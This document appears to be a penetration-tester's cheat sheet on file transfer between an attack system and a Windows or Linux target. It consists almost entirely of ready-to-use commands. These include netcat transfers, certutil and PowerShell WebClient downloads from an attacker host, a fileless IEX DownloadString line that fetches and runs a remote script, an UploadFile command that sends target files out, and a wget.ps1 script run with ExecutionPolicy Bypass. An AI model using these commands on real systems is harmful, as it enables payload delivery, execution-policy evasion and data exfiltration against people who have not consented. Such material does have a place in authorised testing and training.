## File transfer via netcat

Netcat - listen for incoming file

```bash
nc -nlvp 4444 > incoming.exe
```

Netcat - send file

```bash 
nc -nv <ip address> 4444 < outgoing.exe
```

## File transfers via web

```bash
# Set up web server
python3 -m http.server

# Alternate if using /var/www
systemctl start apache2
```

```bash
# Commands for Windows systems to grab file from attack system
certutil -urlcache -f http://<ip>/<file>
cscript wget.vbs http://<ip>/<file> <file>
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ip>/<file>', '<file>')
```

```powershell
# Run powershell script on attack systemwithout saving to disk
powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/<file.ps1>')
```

```bash
# Transfer file to attack system (using upload.php script)
powershell (New-Object System.Net.WebClient).UploadFile('http://<ip>/upload.php', '<file>')
```

### wget.ps1 script

```powershell
# Create file on command line
C:\> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\> echo $url = "http://<ip>/<file>" >>wget.ps1
C:\> echo $file = "<file>" >>wget.ps1
C:\> echo $webclient.DownloadFile($url,$file) >>wget.ps1

# Run script
C:\> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

